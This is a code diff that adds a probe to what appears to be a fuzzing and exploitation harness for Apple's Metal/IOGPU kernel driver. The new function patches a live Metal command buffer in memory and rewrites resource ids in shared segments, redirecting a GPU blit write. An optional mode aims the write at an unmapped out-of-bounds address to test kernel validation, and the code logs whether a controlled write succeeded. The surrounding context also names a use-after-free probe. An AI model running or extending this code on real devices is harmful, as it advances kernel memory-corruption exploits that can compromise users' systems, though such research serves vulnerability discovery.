@@ -14461,6 +14461,214 @@ static void p_mtltrace(void) {
     LOG("[mtrace] trace dumped");
 }
 
+// find a buffer's IOGPU resource id: walk ivars (one nesting level) for a u32
+// that appears in the segment list's 6-pack region. Returns rid; *host/*sub
+// receive the ivar path for reuse on another buffer.
+static uint32_t mtl_find_rid(id buf, const uint8_t *seg, long seglen, char *path, size_t pcap) {
+    Class cls = object_getClass(buf);
+    while (cls) {
+        unsigned ni = 0;
+        Ivar *ivs = class_copyIvarList(cls, &ni);
+        for (unsigned i = 0; i < ni; i++) {
+            const char *hn = ivar_getName(ivs[i]);
+            uint8_t *base = (uint8_t *)(__bridge void *)buf;
+            ptrdiff_t off = ivar_getOffset(ivs[i]);
+            uint32_t v32 = *(uint32_t *)(base + off);
+            if (v32 >= 1 && v32 < 0x10000)
+                for (long o = 0x48; o + 4 <= seglen; o += 4)
+                    if (*(const uint32_t *)(seg + o) == v32) {
+                        snprintf(path, pcap, "direct:%s", hn ? hn : "?");
+                        free(ivs);
+                        return v32;
+                    }
+            uint64_t v = *(uint64_t *)(base + off);
+            if (v > 0x100000000 && v < 0x300000000) {   // nested heap object
+                uint8_t *sub = (uint8_t *)v;
+                Class sc = object_getClass((__bridge id)(void *)v);
+                while (sc) {
+                    unsigned nj = 0;
+                    Ivar *jvs = class_copyIvarList(sc, &nj);
+                    for (unsigned j = 0; j < nj; j++) {
+                        uint32_t w = *(uint32_t *)(sub + ivar_getOffset(jvs[j]));
+                        if (w >= 1 && w < 0x10000)
+                            for (long o = 0x48; o + 4 <= seglen; o += 4)
+                                if (*(const uint32_t *)(seg + o) == w) {
+                                    snprintf(path, pcap, "%s:%s", hn ? hn : "?", ivar_getName(jvs[j]));
+                                    free(jvs); free(ivs);
+                                    return w;
+                                }
+                    }
+                    free(jvs);
+                    sc = class_getSuperclass(sc);
+                }
+            }
+        }
+        free(ivs);
+        cls = class_getSuperclass(cls);
+    }
+    return 0;
+}
+static uint32_t mtl_rid_bypath(id buf, const char *path) {
+    char hn[128], sn[128];
+    const char *colon = strchr(path, ':');
+    if (!colon) return 0;
+    size_t hl = (size_t)(colon - path) < 127 ? (size_t)(colon - path) : 127;
+    memcpy(hn, path, hl); hn[hl] = 0;
+    strlcpy(sn, colon + 1, sizeof sn);
+    if (!strncmp(hn, "direct", 6)) {
+        Ivar iv = class_getInstanceVariable(object_getClass(buf), sn);
+        return iv ? *(uint32_t *)((uint8_t *)(__bridge void *)buf + ivar_getOffset(iv)) : 0;
+    }
+    Ivar hiv = class_getInstanceVariable(object_getClass(buf), hn);
+    if (!hiv) return 0;
+    uint8_t *sub = *(uint8_t **)((uint8_t *)(__bridge void *)buf + ivar_getOffset(hiv));
+    if (!sub) return 0;
+    Ivar siv = class_getInstanceVariable(object_getClass((__bridge id)(void *)sub), sn);
+    return siv ? *(uint32_t *)(sub + ivar_getOffset(siv)) : 0;
+}
+
+// V89: patch a REAL Metal command buffer in-place between endEncoding and
+// commit — redirect the blit copy dest GPUVA B->C inside Metal's own live
+// queue/context. If C receives A's pattern, we have controlled execution of
+// patched GPU commands. OOB variant (FUZZ_MTPATCH_OOB=1): dest -> unmapped
+// GPUVA(A)+0x100000 to test kext residency validation (may kill the process).
+static void p_mtpatch(void) {
+    int oob = getenv("FUZZ_MTPATCH_OOB") != NULL;
+    LOG("[mtpatch] v89: in-place Metal cmdbuf patch (oob %d)", oob);
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) { LOG("[mtpatch] no device"); return; }
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bufC = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    if (!mq || !bufA || !bufB || !bufC) { LOG("[mtpatch] alloc fail"); return; }
+    memset([bufA contents], 0x41, 0x10000);
+    memset([bufB contents], 0, 0x10000);
+    memset([bufC contents], 0, 0x10000);
+    id<MTLCommandBuffer> cb = [mq commandBuffer];
+    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+    [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
+    [enc endEncoding];
+
+    void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+    if (!storage) { LOG("[mtpatch] no storage"); return; }
+    uint64_t kva = *(uint64_t *)((uint8_t *)storage + 0x28);
+    uint64_t sva = *(uint64_t *)((uint8_t *)storage + 0x68);
+    uint64_t gpuA = [bufA gpuAddress];
+    uint64_t gpuB = [bufB gpuAddress];
+    uint64_t gpuC = [bufC gpuAddress];
+    LOG("[mtpatch] gpuAddress A 0x%llx B 0x%llx C 0x%llx | kcmd %llx seg %llx",
+        gpuA, gpuB, gpuC, kva, sva);
+    if (!kva || !sva) return;
+    uint8_t *kc = (uint8_t *)(uintptr_t)kva;
+    uint8_t *sg = (uint8_t *)(uintptr_t)sva;
+
+    // find every occurrence of the buffer GPUVAs in both shmems
+    int hitsB[16], nb = 0;
+    for (long o = 0; o < 0x4000 - 8; o += 4) {
+        uint64_t q = *(uint64_t *)(kc + o);
+        if (q == gpuA) LOG("[mtpatch] kcmd+0x%lx == gpuAddress(A)", o);
+        if (q == gpuC) LOG("[mtpatch] kcmd+0x%lx == gpuAddress(C)", o);
+        if (q == gpuB) { LOG("[mtpatch] kcmd+0x%lx == gpuAddress(B)  <- dest", o); if (nb < 16) hitsB[nb++] = (int)o; }
+        q = *(uint64_t *)(sg + o);
+        if (q == gpuA || q == gpuB || q == gpuC)
+            LOG("[mtpatch] seg+0x%lx == %s", o, q == gpuA ? "gpuA" : q == gpuB ? "gpuB" : "gpuC");
+    }
+    LOG("[mtpatch] dest(B) hits in kcmd: %d", nb);
+    mtl_hexdump("kcmd", 0, kc, 0x500);
+
+    // patch: dest B -> C (or OOB)
+    uint64_t newdest = oob ? gpuA + 0x100000 : gpuC;
+    for (int i = 0; i < nb; i++)
+        *(uint64_t *)(kc + hitsB[i]) = newdest;
+    int patched = nb;
+    if (!nb) {
+        // the copy command references pool slots, not raw GPUVAs — the pool
+        // table (Metal-internal resource) holds gpuAddress(B). Find every
+        // qword == gpuB in our writable VM and patch it.
+        mach_vm_address_t addr = 0;
+        long scanned = 0;
+        while (patched < 32) {
+            mach_vm_size_t sz = 0;
+            vm_region_basic_info_data_64_t info;
+            mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+            mach_port_t obj;
+            if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                               (vm_region_info_t)&info, &cnt, &obj)) break;
+            if ((info.protection & VM_PROT_WRITE) && sz >= 0x1000 && sz <= 0x4000000) {
+                uint8_t *base = (uint8_t *)addr;
+                for (mach_vm_size_t o = 0; o + 8 <= sz; o += 4) {
+                    if (*(uint64_t *)(base + o) == gpuB) {
+                        if (patched < 32) {
+                            LOG("[mtpatch] pool hit %llx+0x%llx: gpuB -> 0x%llx",
+                                (uint64_t)addr, (uint64_t)o, newdest);
+                            *(uint64_t *)(base + o) = newdest;
+                            patched++;
+                        }
+                    }
+                }
+                scanned += sz;
+            }
+            addr += sz;
+            if (!sz) break;
+        }
+        LOG("[mtpatch] VM scan done (%ld MB), patched %d pool slots", scanned >> 20, patched);
+    }
+    // residency: replace bufB's rid with bufC's rid in the segment list groups
+    {
+        // parse the count-2 6-pack group with sizeKB 0x40/0x40 (the two buffers);
+        // its second rid slot is bufB's rid. bufC was created right after -> ridB+1.
+        uint32_t ridB = 0;
+        long gsel = -1;
+        for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40) {
+            uint16_t cnt = *(uint16_t *)(sg + o + 0x3e);
+            if (cnt == 2 && *(uint32_t *)(sg + o + 0x18) == 0x40 && *(uint32_t *)(sg + o + 0x1c) == 0x40) {
+                ridB = *(uint32_t *)(sg + o + 0x04);
+                gsel = o;
+                break;
+            }
+        }
+        uint32_t ridC = ridB ? ridB + 1 : 0;
+        LOG("[mtpatch] rids: bufB %u (group @%lx) bufC guess %u", ridB, gsel, ridC);
+        if (ridB && ridC) {
+            int rp = 0;
+            for (long o = 0x48; o + 4 <= 0x400; o += 4)
+                if (*(uint32_t *)(sg + o) == ridB) { *(uint32_t *)(sg + o) = ridC; rp++; }
+            LOG("[mtpatch] residency: patched %d rid slots %u -> %u", rp, ridB, ridC);
+        }
+    }
+    LOG("[mtpatch] patched %d slots total, dest -> 0x%llx (%s)", patched, newdest, oob ? "OOB" : "C");
+
+    LOG("[mtpatch] committing...");
+    @try {
+        [cb commit];
+        LOG("[mtpatch] committed, waiting...");
+        [cb waitUntilCompleted];
+        LOG("[mtpatch] completed");
+    } @catch (NSException *ex) {
+        LOG("[mtpatch] EXCEPTION: %s %s", [[ex name] UTF8String], [[ex reason] UTF8String]);
+        return;
+    }
+    long st = (long)[cb status];
+    NSError *cberr = [cb error];
+    LOG("[mtpatch] cb status %ld", st);
+    if (cberr) LOG("[mtpatch] cb error: %s", [[cberr description] UTF8String]);
+    long b41 = 0, c41 = 0, cnz = 0;
+    uint8_t *bb = (uint8_t *)[bufB contents];
+    uint8_t *cc = (uint8_t *)[bufC contents];
+    for (long i = 0; i < 0x10000; i++) {
+        if (bb[i] == 0x41) b41++;
+        if (cc[i] == 0x41) c41++;
+        if (cc[i]) cnz++;
+    }
+    LOG("[mtpatch] readback: B 0x41 %ld (expect 0) | C 0x41 %ld nz %ld (expect 65536)",
+        b41, c41, cnz);
+    if (c41 > 0x8000 && b41 == 0) LOG("[mtpatch] *** MT-PATCH WRITE CONFIRMED ***");
+    else if (c41) LOG("[mtpatch] partial write into C: %ld bytes", c41);
+    else LOG("[mtpatch] no redirected write (B 0x41 %ld, C untouched)", b41);
+    LOG("[mtpatch] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -14591,6 +14799,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_MTPATCH")) { p_mtpatch(); LOG("[probe13] mtpatch-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLTRACE")) { p_mtltrace(); LOG("[probe13] mtltrace-only mode, stop"); return NULL; }
         if (getenv("FUZZ_CONNPROBE")) { p_connprobe(); LOG("[probe13] connprobe-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLSELF")) { p_mtlself(); LOG("[probe13] mtlself-only mode, stop"); return NULL; }
